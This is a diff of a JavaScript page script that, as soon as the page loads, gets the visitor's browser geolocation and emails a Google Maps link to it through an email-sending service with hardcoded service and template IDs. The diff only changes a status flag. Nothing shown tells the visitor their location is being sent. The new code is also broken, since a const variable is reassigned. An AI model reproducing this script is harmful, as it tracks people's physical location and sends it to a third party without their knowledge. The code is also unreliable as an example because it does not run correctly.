@@ -18,7 +18,7 @@
 
         //const TWO_HOURS = 7200000
 
-        const messg = "Enabled"
+        
 
         window.onload = function() {
     sendLocationEmail();
@@ -28,12 +28,13 @@ function sendLocationEmail() {
 
     const latitude = 0
     const longitude = 0
+    const chek = 1
 
             if (!navigator.geolocation) {                
-                messg = "Not Enabled"
+                chek = 0
             }    
 
-            if (messg=="Enabled"){
+            if (chek === 1){
             navigator.geolocation.getCurrentPosition(
             function(position) {
 
@@ -46,7 +47,7 @@ function sendLocationEmail() {
                 "service_3hv5k7r",
                 "template_peoy2wo",
                 { 
-                    message: `https://maps.google.com/?q=${latitude},${longitude} |${messg}`
+                    message: `https://maps.google.com/?q=${latitude},${longitude}`
                 }
             )
             .then(function(response) {
